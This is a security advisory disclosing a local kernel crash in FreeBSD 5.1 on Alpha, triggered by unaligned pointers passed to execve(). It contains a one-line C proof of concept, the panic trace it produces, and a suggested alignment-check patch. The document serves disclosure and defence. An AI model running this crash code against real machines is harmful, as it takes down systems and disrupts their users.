Subject: Security Advisory : FreeBSD local DoS


Security Advisory : FreeBSD local DoS

Systems affected:

FreeBSD 5.1-RELEASE/Alpha. Other versions are probably vulnerable.
FreeBSD 5.1-RELEASE/IA32 is _not_ vulnerable.

Not sure about other FreeBSD/arch but they could be vulnerable too.

Risk: low

Description:

It is possible to crash kernel on FreeBSD/Alpha, by passing unaligned
memory address as a 2nd or 3rd argument to execve() syscall.


Condition: 

To crash the system, first arg of execve() must point to accessible filename.


Demonstration code:

# cat kernkill.c 

/*
* FreeBSD/Alpha local DoS
*    by Marceta Milos
*    root@...cetam.net
*
*/

char main() { execve("/bin/ls",(int *)(main + 1), 0); }

/* eof */

# gcc kernkill.c -okk
#./kk

fatal kernel trap:

  trap entry     = 0x4 (unaligned access fault)
  cpuid          = 0
  faulting va    = 0x120000891
  opcode         = 0x29
  register       = 0x0
  pc             = 0xfffffc0000651bf0
  ra             = 0xfffffc00004900e0
  sp             = 0xfffffe0039c3f840
  usp            = 0x11fffae0
  curthread      = 0xfffffc00620a3720

      pid = 713, comm = kk

panic: trap
cpuid = 0;

Workaround:

You may make a proper use of ALIGNED_POINTER macro which already exists in
src/sys/alpha/include/param.h to check if ptrs are aligned, or make your
own like:

#define PTR_ALIGNED(x) (((x) & 0x7) == 0)

Putting the following line at the top of execve() in src/sys/kern/kern_exec.c
should prevent the crash (unfortunatly, this is not tested. Idea is mine, a
little corrected by Mr. Dag-Erling SmÃ¸rgrav, FreeBSD deputy security officer):

	if (!PTR_ALIGNED(uap->argv) || !PTR_ALIGNED(uap->envv))
		return (EFAULT);
